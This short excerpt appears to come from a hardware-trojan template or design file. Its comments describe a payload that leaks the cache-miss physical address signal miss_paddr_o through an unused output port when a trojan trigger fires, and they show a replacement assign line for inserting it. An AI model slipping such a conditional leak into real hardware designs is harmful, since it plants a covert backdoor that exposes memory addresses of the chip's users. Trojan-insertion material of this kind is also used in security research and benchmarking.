 ...
 * Payload: Route miss_paddr_o to leak port
 * 
...
// ============================================================
// Information Leak: Route miss_paddr_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? miss_paddr_o : normal_value;